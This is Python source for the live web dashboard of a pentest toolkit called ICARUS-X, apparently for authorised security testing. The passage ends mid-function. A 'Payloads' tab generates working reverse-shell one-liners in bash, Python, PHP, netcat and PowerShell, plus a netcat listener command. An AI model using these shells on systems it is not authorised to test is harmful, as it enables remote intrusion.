"""
ICARUS-X Live Dashboard Module
===============================
Comprehensive real-time web dashboard with background server.
Shows all ICARUS-X activities, findings, and tools.
"""

import asyncio
import json
import os
import sys
import signal
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Optional
from http.server import HTTPServer, SimpleHTTPRequestHandler
import webbrowser

from rich.console import Console

console = Console()

# Shared state file for inter-process communication
STATE_DIR = Path.home() / ".icarus-x"
STATE_FILE = STATE_DIR / "dashboard_state.json"
PID_FILE = STATE_DIR / "dashboard.pid"
LOG_FILE = STATE_DIR / "dashboard.log"

# Ensure state directory exists
STATE_DIR.mkdir(exist_ok=True)


class DashboardState:
    """Shared state for dashboard updates."""
    
    @staticmethod
    def init():
        """Initialize empty state."""
        state = {
            "started_at": datetime.now().isoformat(),
            "stats": {
                "targets_scanned": 0,
                "critical": 0,
                "high": 0,
                "medium": 0,
                "low": 0,
                "info": 0,
            },
            "scans": [],
            "findings": [],
            "logs": [],
            "tools": {},
            "wordlists": {},
            "active_scan": None,
            "progress": 0,
        }
        DashboardState.save(state)
        return state
    
    @staticmethod
    def load() -> dict:
        """Load state from file."""
        try:
            if STATE_FILE.exists():
                return json.loads(STATE_FILE.read_text())
        except Exception:
            pass
        return DashboardState.init()
    
    @staticmethod
    def save(state: dict):
        """Save state to file."""
        try:
            STATE_FILE.write_text(json.dumps(state, indent=2, default=str))
        except Exception as e:
            console.print(f"[red]Error saving state: {e}[/red]")
    
    @staticmethod
    def add_log(level: str, message: str):
        """Add a log entry."""
        state = DashboardState.load()
        state["logs"].insert(0, {
            "time": datetime.now().isoformat(),
            "level": level,
            "message": message,
        })
        # Keep last 100 logs
        state["logs"] = state["logs"][:100]
        DashboardState.save(state)
    
    @staticmethod
    def add_finding(target: str, title: str, severity: str, category: str = "", details: str = ""):
        """Add a finding."""
        state = DashboardState.load()
        finding = {
            "id": len(state["findings"]) + 1,
            "time": datetime.now().isoformat(),
            "target": target,
            "title": title,
            "severity": severity,
            "category": category,
            "details": details,
            "status": "New",
        }
        state["findings"].insert(0, finding)
        
        # Update stats
        sev_lower = severity.lower()
        if sev_lower in state["stats"]:
            state["stats"][sev_lower] += 1
        
        DashboardState.save(state)
        return finding
    
    @staticmethod
    def add_scan(scan_type: str, target: str, status: str = "running"):
        """Add or update a scan."""
        state = DashboardState.load()
        scan = {
            "id": len(state["scans"]) + 1,
            "type": scan_type,
            "target": target,
            "status": status,
            "started_at": datetime.now().isoformat(),
            "findings_count": 0,
        }
        state["scans"].insert(0, scan)
        state["active_scan"] = scan
        state["stats"]["targets_scanned"] += 1
        DashboardState.save(state)
        return scan
    
    @staticmethod
    def update_progress(percent: int, message: str = ""):
        """Update scan progress."""
        state = DashboardState.load()
        state["progress"] = percent
        if message:
            state["progress_message"] = message
        DashboardState.save(state)
    
    @staticmethod
    def complete_scan(findings_count: int = 0):
        """Mark current scan as complete."""
        state = DashboardState.load()
        if state.get("active_scan"):
            state["active_scan"]["status"] = "completed"
            state["active_scan"]["findings_count"] = findings_count
            state["active_scan"]["completed_at"] = datetime.now().isoformat()
        state["active_scan"] = None
        state["progress"] = 100
        DashboardState.save(state)


# Dashboard HTML - Comprehensive View
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICARUS-X Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0a1a;
            --bg-secondary: #12122a;
            --bg-card: rgba(255, 255, 255, 0.03);
            --border: rgba(0, 255, 255, 0.15);
            --cyan: #00ffff;
            --magenta: #ff00ff;
            --green: #00ff88;
            --red: #ff4466;
            --orange: #ff8844;
            --yellow: #ffcc00;
            --blue: #4488ff;
            --text: #e0e0f0;
            --text-dim: #888899;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: var(--bg-primary);
            color: var(--text);
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Animated background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 20%, rgba(0, 255, 255, 0.05) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 80%, rgba(255, 0, 255, 0.05) 0%, transparent 50%);
            pointer-events: none;
            z-index: -1;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 25px;
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(20px);
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, var(--cyan), var(--magenta));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo-icon {
            font-size: 28px;
        }
        
        .header-controls {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .status-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid var(--green);
            border-radius: 20px;
            font-size: 13px;
            color: var(--green);
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--green);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
            50% { opacity: 0.8; box-shadow: 0 0 0 8px rgba(0, 255, 136, 0); }
        }
        
        .refresh-btn {
            background: transparent;
            border: 1px solid var(--border);
            color: var(--text);
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.3s;
        }
        
        .refresh-btn:hover {
            background: var(--bg-card);
            border-color: var(--cyan);
        }
        
        .refresh-btn.spinning svg {
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        /* Navigation Tabs */
        .nav-tabs {
            display: flex;
            gap: 5px;
            padding: 15px 0;
            border-bottom: 1px solid var(--border);
            margin-bottom: 20px;
            overflow-x: auto;
        }
        
        .nav-tab {
            padding: 10px 20px;
            background: transparent;
            border: 1px solid transparent;
            color: var(--text-dim);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            white-space: nowrap;
            font-size: 14px;
        }
        
        .nav-tab:hover {
            color: var(--text);
            background: var(--bg-card);
        }
        
        .nav-tab.active {
            color: var(--cyan);
            background: rgba(0, 255, 255, 0.1);
            border-color: var(--cyan);
        }
        
        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 40px rgba(0, 255, 255, 0.1);
        }
        
        .stat-label {
            font-size: 12px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: 700;
            font-family: 'JetBrains Mono', monospace;
        }
        
        .stat-card.critical .stat-value { color: var(--red); }
        .stat-card.high .stat-value { color: var(--orange); }
        .stat-card.medium .stat-value { color: var(--yellow); }
        .stat-card.low .stat-value { color: var(--green); }
        .stat-card.info .stat-value { color: var(--cyan); }
        
        /* Progress Bar */
        .progress-section {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }
        
        .progress-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .progress-title {
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--cyan), var(--magenta));
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        
        /* Main Content Grid */
        .main-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
        }
        
        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }
        
        /* Panels */
        .panel {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid var(--border);
            background: rgba(255, 255, 255, 0.02);
        }
        
        .panel-title {
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .panel-body {
            padding: 15px 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        
        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        
        th {
            font-size: 11px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 500;
        }
        
        tr:hover {
            background: rgba(0, 255, 255, 0.03);
        }
        
        /* Badges */
        .badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .badge.critical { background: rgba(255, 68, 102, 0.2); color: var(--red); }
        .badge.high { background: rgba(255, 136, 68, 0.2); color: var(--orange); }
        .badge.medium { background: rgba(255, 204, 0, 0.2); color: var(--yellow); }
        .badge.low { background: rgba(0, 255, 136, 0.2); color: var(--green); }
        .badge.info { background: rgba(0, 255, 255, 0.2); color: var(--cyan); }
        .badge.running { background: rgba(68, 136, 255, 0.2); color: var(--blue); }
        .badge.completed { background: rgba(0, 255, 136, 0.2); color: var(--green); }
        
        /* Log entries */
        .log-entry {
            padding: 10px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            display: flex;
            gap: 10px;
        }
        
        .log-time {
            color: var(--text-dim);
            flex-shrink: 0;
        }
        
        .log-level {
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 600;
            flex-shrink: 0;
        }
        
        .log-level.info { background: rgba(0, 255, 255, 0.2); color: var(--cyan); }
        .log-level.success { background: rgba(0, 255, 136, 0.2); color: var(--green); }
        .log-level.warning { background: rgba(255, 204, 0, 0.2); color: var(--yellow); }
        .log-level.error { background: rgba(255, 68, 102, 0.2); color: var(--red); }
        
        .log-message {
            flex: 1;
            word-break: break-word;
        }
        
        /* Tools Section */
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
        }
        
        .tool-item {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 8px;
            font-size: 13px;
        }
        
        .tool-status {
            width: 8px;
            height: 8px;
            border-radius: 50%;
        }
        
        .tool-status.installed { background: var(--green); }
        .tool-status.missing { background: var(--red); }
        
        /* Quick Actions */
        .quick-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        
        .action-btn {
            padding: 10px 20px;
            background: linear-gradient(135deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 255, 0.1));
            border: 1px solid var(--cyan);
            color: var(--cyan);
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.3s;
        }
        
        .action-btn:hover {
            background: linear-gradient(135deg, rgba(0, 255, 255, 0.2), rgba(255, 0, 255, 0.2));
            transform: translateY(-2px);
        }
        
        /* Command Line Section */
        .command-section {
            margin-top: 20px;
        }
        
        .command-input {
            display: flex;
            gap: 10px;
        }
        
        .command-input input {
            flex: 1;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 12px 16px;
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
        }
        
        .command-input input:focus {
            outline: none;
            border-color: var(--cyan);
        }
        
        .command-input button {
            padding: 12px 24px;
            background: var(--cyan);
            color: var(--bg-primary);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
        }
        
        .command-input button:hover {
            background: var(--magenta);
        }
        
        /* Empty state */
        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--text-dim);
        }
        
        .empty-icon {
            font-size: 48px;
            margin-bottom: 15px;
            opacity: 0.5;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        
        ::-webkit-scrollbar-track {
            background: transparent;
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 3px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--cyan);
        }
        
        /* Tab Content */
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Scan Cards */
        .scan-card {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
        }
        
        .scan-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .scan-type {
            font-weight: 600;
            color: var(--cyan);
        }
        
        .scan-target {
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: var(--text-dim);
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <span class="logo-icon">⚡</span>
            <span>ICARUS-X</span>
        </div>
        <div class="header-controls">
            <div class="status-badge">
                <div class="status-dot"></div>
                <span id="connection-status">Connected</span>
            </div>
            <button class="refresh-btn" onclick="refreshData()">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
                </svg>
                <span>Refresh</span>
            </button>
            <span id="last-update" style="color: var(--text-dim); font-size: 12px;">--:--:--</span>
        </div>
    </header>
    
    <div class="container">
        <!-- Navigation Tabs -->
        <div class="nav-tabs">
            <button class="nav-tab active" data-tab="overview">📊 Overview</button>
            <button class="nav-tab" data-tab="scans">🔍 Scans</button>
            <button class="nav-tab" data-tab="findings">🎯 Findings</button>
            <button class="nav-tab" data-tab="tools">🛠️ Tools</button>
            <button class="nav-tab" data-tab="logs">📜 Logs</button>
            <button class="nav-tab" data-tab="payloads">💉 Payloads</button>
        </div>
        
        <!-- Overview Tab -->
        <div class="tab-content active" id="tab-overview">
            <!-- Stats -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-label">Targets Scanned</div>
                    <div class="stat-value" id="stat-targets">0</div>
                </div>
                <div class="stat-card critical">
                    <div class="stat-label">Critical</div>
                    <div class="stat-value" id="stat-critical">0</div>
                </div>
                <div class="stat-card high">
                    <div class="stat-label">High</div>
                    <div class="stat-value" id="stat-high">0</div>
                </div>
                <div class="stat-card medium">
                    <div class="stat-label">Medium</div>
                    <div class="stat-value" id="stat-medium">0</div>
                </div>
                <div class="stat-card low">
                    <div class="stat-label">Low</div>
                    <div class="stat-value" id="stat-low">0</div>
                </div>
                <div class="stat-card info">
                    <div class="stat-label">Info</div>
                    <div class="stat-value" id="stat-info">0</div>
                </div>
            </div>
            
            <!-- Progress -->
            <div class="progress-section" id="progress-section" style="display: none;">
                <div class="progress-header">
                    <div class="progress-title">
                        <span>🔄</span>
                        <span id="progress-title">Scan in progress...</span>
                    </div>
                    <span id="progress-percent">0%</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progress-fill" style="width: 0%"></div>
                </div>
            </div>
            
            <!-- Quick Actions -->
            <div class="quick-actions">
                <button class="action-btn" onclick="copyCommand('scout')">📡 Scout Scan</button>
                <button class="action-btn" onclick="copyCommand('spider')">🕸️ Spider</button>
                <button class="action-btn" onclick="copyCommand('vuln')">🔓 Vuln Scan</button>
                <button class="action-btn" onclick="copyCommand('dirbrute')">📁 DirBrute</button>
                <button class="action-btn" onclick="copyCommand('netmap')">🌐 NetMap</button>
            </div>
            
            <!-- Main Grid -->
            <div class="main-grid">
                <!-- Recent Findings -->
                <div class="panel">
                    <div class="panel-header">
                        <div class="panel-title">🎯 Recent Findings</div>
                        <span id="findings-count" style="color: var(--text-dim); font-size: 12px;">0 total</span>
                    </div>
                    <div class="panel-body" id="findings-list">
                        <div class="empty-state">
                            <div class="empty-icon">🔍</div>
                            <div>No findings yet</div>
                            <div style="font-size: 12px; margin-top: 5px;">Run a scan to discover vulnerabilities</div>
                        </div>
                    </div>
                </div>
                
                <!-- Activity Log -->
                <div class="panel">
                    <div class="panel-header">
                        <div class="panel-title">📜 Activity Log</div>
                    </div>
                    <div class="panel-body" id="logs-list">
                        <div class="log-entry">
                            <span class="log-time">--:--:--</span>
                            <span class="log-level info">INFO</span>
                            <span class="log-message">Dashboard initialized</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Scans Tab -->
        <div class="tab-content" id="tab-scans">
            <h2 style="margin-bottom: 20px;">Recent Scans</h2>
            <div id="scans-list">
                <div class="empty-state">
                    <div class="empty-icon">🔍</div>
                    <div>No scans yet</div>
                </div>
            </div>
        </div>
        
        <!-- Findings Tab -->
        <div class="tab-content" id="tab-findings">
            <h2 style="margin-bottom: 20px;">All Findings</h2>
            <div class="panel">
                <div class="panel-body" style="max-height: none;">
                    <table>
                        <thead>
                            <tr>
                                <th>Target</th>
                                <th>Vulnerability</th>
                                <th>Severity</th>
                                <th>Category</th>
                                <th>Time</th>
                            </tr>
                        </thead>
                        <tbody id="findings-table">
                            <tr>
                                <td colspan="5" class="empty-state">No findings</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <!-- Tools Tab -->
        <div class="tab-content" id="tab-tools">
            <h2 style="margin-bottom: 20px;">Installed Tools</h2>
            <div class="tools-grid" id="tools-grid">
                <div class="tool-item"><span class="tool-status installed"></span>nmap</div>
                <div class="tool-item"><span class="tool-status installed"></span>ffuf</div>
                <div class="tool-item"><span class="tool-status installed"></span>nuclei</div>
                <div class="tool-item"><span class="tool-status installed"></span>gobuster</div>
                <div class="tool-item"><span class="tool-status missing"></span>feroxbuster</div>
                <div class="tool-item"><span class="tool-status installed"></span>whatweb</div>
            </div>
            <div class="command-section">
                <h3 style="margin-bottom: 15px;">Run Tool Check</h3>
                <code style="display: block; padding: 15px; background: var(--bg-secondary); border-radius: 8px; font-family: 'JetBrains Mono', monospace;">
                    python3 icarus.py tools
                </code>
            </div>
        </div>
        
        <!-- Logs Tab -->
        <div class="tab-content" id="tab-logs">
            <h2 style="margin-bottom: 20px;">Full Activity Log</h2>
            <div class="panel">
                <div class="panel-body" style="max-height: 600px;" id="full-logs-list">
                </div>
            </div>
        </div>
        
        <!-- Payloads Tab -->
        <div class="tab-content" id="tab-payloads">
            <h2 style="margin-bottom: 20px;">Payload Generator</h2>
            <div class="quick-actions" style="margin-bottom: 30px;">
                <button class="action-btn" onclick="showPayloads('xss')">XSS Payloads</button>
                <button class="action-btn" onclick="showPayloads('sqli')">SQLi Payloads</button>
                <button class="action-btn" onclick="showPayloads('cmdi')">CMDi Payloads</button>
                <button class="action-btn" onclick="showPayloads('shells')">Reverse Shells</button>
            </div>
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">💉 Generate Reverse Shell</div>
                </div>
                <div class="panel-body">
                    <div style="display: grid; gap: 15px; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));">
                        <div>
                            <label style="display: block; margin-bottom: 5px; color: var(--text-dim); font-size: 12px;">Shell Type</label>
                            <select id="shell-type" style="width: 100%; padding: 10px; background: var(--bg-secondary); border: 1px solid var(--border); color: var(--text); border-radius: 6px;">
                                <option value="bash">Bash</option>
                                <option value="python">Python</option>
                                <option value="python3">Python3</option>
                                <option value="php">PHP</option>
                                <option value="nc">Netcat</option>
                                <option value="powershell">PowerShell</option>
                            </select>
                        </div>
                        <div>
                            <label style="display: block; margin-bottom: 5px; color: var(--text-dim); font-size: 12px;">Your IP</label>
                            <input type="text" id="shell-ip" placeholder="10.10.14.5" style="width: 100%; padding: 10px; background: var(--bg-secondary); border: 1px solid var(--border); color: var(--text); border-radius: 6px;">
                        </div>
                        <div>
                            <label style="display: block; margin-bottom: 5px; color: var(--text-dim); font-size: 12px;">Port</label>
                            <input type="text" id="shell-port" value="4444" style="width: 100%; padding: 10px; background: var(--bg-secondary); border: 1px solid var(--border); color: var(--text); border-radius: 6px;">
                        </div>
                    </div>
                    <button class="action-btn" style="margin-top: 15px;" onclick="generateShell()">Generate Shell</button>
                    <pre id="shell-output" style="margin-top: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 13px; overflow-x: auto; display: none;"></pre>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // State
        let state = {};
        let autoRefresh = true;
        let refreshInterval = null;
        
        // Tab switching
        document.querySelectorAll('.nav-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                tab.classList.add('active');
                document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
            });
        });
        
        // Fetch state
        async function fetchState() {
            try {
                const response = await fetch('/api/state');
                if (response.ok) {
                    state = await response.json();
                    updateUI();
                }
            } catch (e) {
                console.log('Using demo data');
                useDemoData();
            }
        }
        
        // Update UI from state
        function updateUI() {
            // Stats
            document.getElementById('stat-targets').textContent = state.stats?.targets_scanned || 0;
            document.getElementById('stat-critical').textContent = state.stats?.critical || 0;
            document.getElementById('stat-high').textContent = state.stats?.high || 0;
            document.getElementById('stat-medium').textContent = state.stats?.medium || 0;
            document.getElementById('stat-low').textContent = state.stats?.low || 0;
            document.getElementById('stat-info').textContent = state.stats?.info || 0;
            
            // Progress
            const progressSection = document.getElementById('progress-section');
            if (state.active_scan) {
                progressSection.style.display = 'block';
                document.getElementById('progress-title').textContent = 
                    `${state.active_scan.type} - ${state.active_scan.target}`;
                document.getElementById('progress-percent').textContent = state.progress + '%';
                document.getElementById('progress-fill').style.width = state.progress + '%';
            } else {
                progressSection.style.display = 'none';
            }
            
            // Findings
            updateFindings();
            
            // Logs
            updateLogs();
            
            // Scans
            updateScans();
            
            // Update timestamp
            document.getElementById('last-update').textContent = new Date().toLocaleTimeString();
        }
        
        function updateFindings() {
            const findingsList = document.getElementById('findings-list');
            const findingsTable = document.getElementById('findings-table');
            const findings = state.findings || [];
            
            document.getElementById('findings-count').textContent = findings.length + ' total';
            
            if (findings.length === 0) {
                findingsList.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">🔍</div>
                        <div>No findings yet</div>
                    </div>`;
                return;
            }
            
            // Recent findings (overview)
            findingsList.innerHTML = findings.slice(0, 10).map(f => `
                <div style="padding: 10px 0; border-bottom: 1px solid var(--border);">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                        <span style="font-weight: 500;">${f.title}</span>
                        <span class="badge ${f.severity.toLowerCase()}">${f.severity}</span>
                    </div>
                    <div style="font-size: 12px; color: var(--text-dim);">${f.target}</div>
                </div>
            `).join('');
            
            // Full table
            findingsTable.innerHTML = findings.map(f => `
                <tr>
                    <td style="font-family: 'JetBrains Mono', monospace; font-size: 12px;">${f.target}</td>
                    <td>${f.title}</td>
                    <td><span class="badge ${f.severity.toLowerCase()}">${f.severity}</span></td>
                    <td>${f.category || '-'}</td>
                    <td style="color: var(--text-dim); font-size: 12px;">${formatTime(f.time)}</td>
                </tr>
            `).join('');
        }
        
        function updateLogs() {
            const logsList = document.getElementById('logs-list');
            const fullLogsList = document.getElementById('full-logs-list');
            const logs = state.logs || [];
            
            const logsHtml = logs.map(l => `
                <div class="log-entry">
                    <span class="log-time">${formatTime(l.time)}</span>
                    <span class="log-level ${l.level}">${l.level.toUpperCase()}</span>
                    <span class="log-message">${l.message}</span>
                </div>
            `).join('');
            
            logsList.innerHTML = logsHtml || '<div class="log-entry"><span class="log-message">No logs</span></div>';
            fullLogsList.innerHTML = logsHtml || '<div class="log-entry"><span class="log-message">No logs</span></div>';
        }
        
        function updateScans() {
            const scansList = document.getElementById('scans-list');
            const scans = state.scans || [];
            
            if (scans.length === 0) {
                scansList.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">🔍</div>
                        <div>No scans yet</div>
                    </div>`;
                return;
            }
            
            scansList.innerHTML = scans.map(s => `
                <div class="scan-card">
                    <div class="scan-header">
                        <span class="scan-type">${s.type}</span>
                        <span class="badge ${s.status}">${s.status}</span>
                    </div>
                    <div class="scan-target">${s.target}</div>
                    <div style="margin-top: 10px; font-size: 12px; color: var(--text-dim);">
                        Started: ${formatTime(s.started_at)} | Findings: ${s.findings_count || 0}
                    </div>
                </div>
            `).join('');
        }
        
        function formatTime(isoString) {
            if (!isoString) return '--:--:--';
            try {
                return new Date(isoString).toLocaleTimeString();
            } catch {
                return isoString;
            }
        }
        
        function refreshData() {
            const btn = document.querySelector('.refresh-btn');
            btn.classList.add('spinning');
            fetchState().finally(() => {
                setTimeout(() => btn.classList.remove('spinning'), 500);
            });
        }
        
        function copyCommand(type) {
            const commands = {
                'scout': 'python3 icarus.py scout --target example.com',
                'spider': 'python3 icarus.py spider --target https://example.com',
                'vuln': 'python3 icarus.py vuln --target https://example.com',
                'dirbrute': 'python3 icarus.py dirbrute --target https://example.com',
                'netmap': 'python3 icarus.py netmap --range 192.168.1.0/24',
            };
            navigator.clipboard.writeText(commands[type]);
            alert('Command copied to clipboard!');
        }
        
        function showPayloads(type) {
            alert(`View payloads with: python3 icarus.py payloads --list ${type}`);
        }
        
        function generateShell() {
            const type = document.getElementById('shell-type').value;
            const ip = document.getElementById('shell-ip').value || '10.10.14.5';
            const port = document.getElementById('shell-port').value || '4444';
            
            const shells = {
                'bash': `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
                'python': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
                'python3': `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
                'php': `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
                'nc': `nc -e /bin/sh ${ip} ${port}`,
                'powershell': `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});...`,
            };
            
            const output = document.getElementById('shell-output');
            output.style.display = 'block';
            output.textContent = shells[type] + '\\n\\n# Start listener:\\nnc -lvnp ' + port;
        }
        
        function useDemoData() {
            state = {
                stats: { targets_scanned: 5, critical: 2, high: 7, medium: 12, low: 8, info: 15 },
                findings: [
                    { time: new Date().toISOString(), target: 'example.com', title: 'SQL Injection in /api/users', severity: 'Critical', category: 'Injection' },
                    { time: new Date().toISOString(), target: 'example.com', title: 'XSS in comment field', severity: 'High', category: 'XSS' },
                    { time: new Date().toISOString(), target: 'api.example.com', title: 'Missing rate limiting', severity: 'Medium', category: 'Config' },
                ],
                logs: [
                    { time: new Date().toISOString(), level: 'info', message: 'Dashboard started' },
                    { time: new Date().toISOString(), level: 'success', message: 'Scout scan completed' },
                ],
                scans: [
                    { type: 'Scout', target: 'example.com', status: 'completed', started_at: new Date().toISOString(), findings_count: 5 },
                ],
            };
            updateUI();
        }
        
        // Initialize
        fetchState();
        refreshInterval = setInterval(fetchState, 3000);
    </script>
</body>
</html>
'''


class DashboardHandler(SimpleHTTPRequestHandler):
    """HTTP handler for dashboard."""
    
    def log_message(self, format, *args):
        pass  # Suppress logging
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            self.wfile.write(DASHBOARD_HTML.encode())
        
        elif self.path == '/api/state':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            state = DashboardState.load()
            self.wfile.write(json.dumps(state).encode())
        
        else:
            self.send_response(404)
            self.end_headers()


def start_dashboard(port: int = 8080, open_browser: bool = True, background: bool = False):
    """Start the dashboard server."""
    
    # Check if already running
    if is_dashboard_running():
        console.print(f"[yellow]Dashboard already running![/yellow]")
        console.print(f"[dim]Open: http://localhost:{get_running_port()}[/dim]")
        return
    
    # Initialize state
    DashboardState.init()
    DashboardState.add_log("info", "Dashboard server started")
    
    console.print(f"\n[bold cyan]ICARUS-X Dashboard[/bold cyan]")
    console.print(f"[green]✓ Server started on http://localhost:{port}[/green]")
    console.print(f"[dim]Press Ctrl+C to stop[/dim]\n")
    
    # Save PID
    PID_FILE.write_text(json.dumps({"pid": os.getpid(), "port": port}))
    
    # Open browser
    if open_browser:
        webbrowser.open(f"http://localhost:{port}")
    
    # Start server
    try:
        server = HTTPServer(("0.0.0.0", port), DashboardHandler)
